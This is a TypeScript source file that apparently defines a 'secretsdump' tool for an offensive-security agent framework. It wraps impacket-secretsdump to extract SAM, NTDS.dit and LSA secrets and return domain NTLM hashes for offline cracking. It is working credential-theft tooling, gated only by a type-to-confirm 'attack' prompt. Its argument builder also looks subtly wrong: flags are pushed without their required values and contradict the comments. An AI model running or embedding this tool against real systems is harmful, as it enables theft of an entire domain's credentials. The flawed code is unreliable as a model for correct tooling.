/**
 * v0.4-B — `secretsdump` tool. Wraps `impacket-secretsdump` to
 * extract credential material (SAM/SECURITY/SYSTEM hives, NTDS.dit
 * hashes, LSA secrets, Kerberos keys, cached domain hashes) from
 * a Windows target. The most data-dense AD tool — one successful
 * run gives the operator offline-crackable NTLM hashes for the
 * entire domain.
 *
 * Chokepoint contract: same as `psexec` (see `./psexec.ts`).
 */

import { z } from 'zod';
import { run } from '../shared/runner.js';
import type { Tool, ToolContext } from '@gmft/core';
import {
  AdInputBase,
  AdOutputBase,
  AD_IMAGE,
  buildImpacketTarget,
  defaultAdFindings,
} from './shared.js';

export const SecretsdumpInput = AdInputBase.merge(
  z.object({
    /** When true, dump NTDS.dit hashes (full domain). Default true. */
    justDcUser: z.boolean().optional(),
    /** When true, dump SAM/SECURITY/SYSTEM hives on the target. Default true. */
    system: z.boolean().optional(),
  }),
);
export type SecretsdumpInputT = z.infer<typeof SecretsdumpInput>;

export const SecretsdumpOutput = AdOutputBase;
export type SecretsdumpOutputT = z.infer<typeof SecretsdumpOutput>;

export function buildSecretsdumpArgs(input: SecretsdumpInputT): string[] {
  const target = buildImpacketTarget(input);
  const argv = ['impacket-secretsdump'];
  if (input.justDcUser) argv.push('-just-dc-user');
  if (input.system === false) argv.push('-system');
  argv.push(target);
  return argv;
}

export const secretsdumpTool: Tool<
  typeof SecretsdumpInput,
  typeof SecretsdumpOutput
> = {
  name: 'secretsdump',
  category: 'ad',
  flags: ['destructive', 'targetRequired'],
  typeToConfirm: 'attack',
  description:
    'Dump SAM/NTDS.dit/LSA secrets from a Windows target via impacket-secretsdump. ' +
    'Returns NTLM hashes ready for offline cracking.',
  input: SecretsdumpInput,
  output: SecretsdumpOutput,
  async run(
    input: SecretsdumpInputT,
    _ctx: ToolContext,
  ): Promise<SecretsdumpOutputT> {
    const parsed = SecretsdumpInput.parse(input);
    const argv = buildSecretsdumpArgs(parsed);
    const r = await run({ argv, image: AD_IMAGE, timeoutMs: 180_000 });
    return {
      stdout: r.stdout,
      stderr: r.stderr,
      exitCode: r.exitCode,
      durationMs: r.durationMs,
      mode: r.mode,
      fellBack: r.fellBack,
      findings: [...defaultAdFindings(r.stdout)],
    };
  },
};
